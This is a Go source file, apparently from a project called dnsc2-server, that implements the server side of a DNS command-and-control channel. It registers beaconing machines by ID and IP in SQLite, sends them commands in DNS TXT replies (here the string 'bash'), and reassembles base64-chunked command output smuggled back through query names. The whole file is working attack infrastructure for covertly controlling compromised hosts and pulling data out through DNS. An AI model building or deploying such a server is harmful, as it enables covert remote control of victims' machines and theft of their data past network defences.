package cmd

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/erdaltsksn/cui"
	_ "github.com/mattn/go-sqlite3"
	"github.com/miekg/dns"
	"github.com/spf13/cobra"
	"github.com/syrull/dnsc2-server/pkg"
)

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Start a DNS C2 Server",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println(pkg.PrintHeader())

		db, err := sql.Open("sqlite3", dbName)
		cobra.CheckErr(err)
		defer db.Close()

		bind, err := cmd.Flags().GetString("bind")
		cobra.CheckErr(err)
		srv := &dns.Server{Addr: bind, Net: "udp"}

		msg := fmt.Sprintf("UDP DNS Server started listening on %s \n", bind)

		cui.Info(msg)
		go func() {
			if err := srv.ListenAndServe(); err != nil {
				cui.Error("Failed to set tcp listener %s\n", err)
			}
		}()

		// Used to Save State with multiple messages
		var outputBuffer []string

		dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
			client := &pkg.Client{}
			now := time.Now()
			remoteIp := pkg.GetIp(w.RemoteAddr().String())

			urlConstr := "https://" + req.Question[0].Name[:len(req.Question[0].Name)-1]
			malMess, err := url.Parse(urlConstr)
			if err != nil {
				fmt.Println("URL Parsing Error")
			}
			message := malMess.Query()
			machineId := message["mid"][0]

			// Registering a Machine
			lookUpQuery := db.QueryRow("SELECT * FROM client WHERE (machine_id = ? AND remote_ip = ?)", machineId, remoteIp)
			if err := lookUpQuery.Scan(&client.Id, &client.MachineId, &client.RemoteIp, &client.LastUpdated, &client.CreatedAt); err != nil {
				if err == sql.ErrNoRows {
					_, err := db.Exec("INSERT INTO client VALUES(NULL,?,?,?,?)",
						machineId, remoteIp, now.Unix(), now.Unix())
					cobra.CheckErr(err)
				} else {
					cui.Error("", err)
				}
			}

			// Updating an existent machine
			_, err = db.Exec("UPDATE client SET last_updated = ? WHERE id = ?", now.Unix(), client.Id)
			if err != nil {
				fmt.Println("Update Client Error")
			}

			// Sending a command
			m := new(dns.Msg)
			m.SetReply(req)
			m.Authoritative = true
			defer w.WriteMsg(m)
			m.Answer = append(m.Answer, &dns.TXT{
				Hdr: dns.RR_Header{
					Name:  req.Question[0].Name,
					Class: req.Question[0].Qclass,
					Ttl:   0, Rrtype: dns.TypeTXT,
				},
				Txt: []string{"bash"},
			})

			// Unpack message if it has output
			if messageValue, ok := message["o"]; ok {
				chunkLen := message["cs"][0]
				currentChunk := message["cc"][0]

				outputBuffer = append(outputBuffer, messageValue[0])
				if currentChunk == chunkLen {
					joinResult := strings.Join(outputBuffer, "")
					sDec, _ := base64.StdEncoding.DecodeString(joinResult)
					fmt.Println(string(sDec))
					outputBuffer = nil
				}
			}

		})

		pkg.WaitForExit(srv)
	},
}

func init() {
	rootCmd.AddCommand(serveCmd)
	serveCmd.Flags().StringP("bind", "b", "127.0.0.1:8053", "Bind an address for the c2 server")
}
